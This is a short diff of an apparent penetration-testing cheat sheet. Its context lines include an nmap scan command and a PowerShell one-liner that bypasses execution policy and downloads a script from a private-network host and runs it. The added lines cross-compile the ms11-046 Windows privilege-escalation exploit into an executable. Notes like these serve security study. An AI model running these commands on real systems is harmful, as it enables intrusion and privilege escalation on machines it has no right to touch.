@@ -128,3 +128,6 @@ nmap -sS -v -v -Pn <IP>
 
 Bypass execution policy Powershell:
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.149:8081/login.ps1')"
+
+Cross compilation an example:
+i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
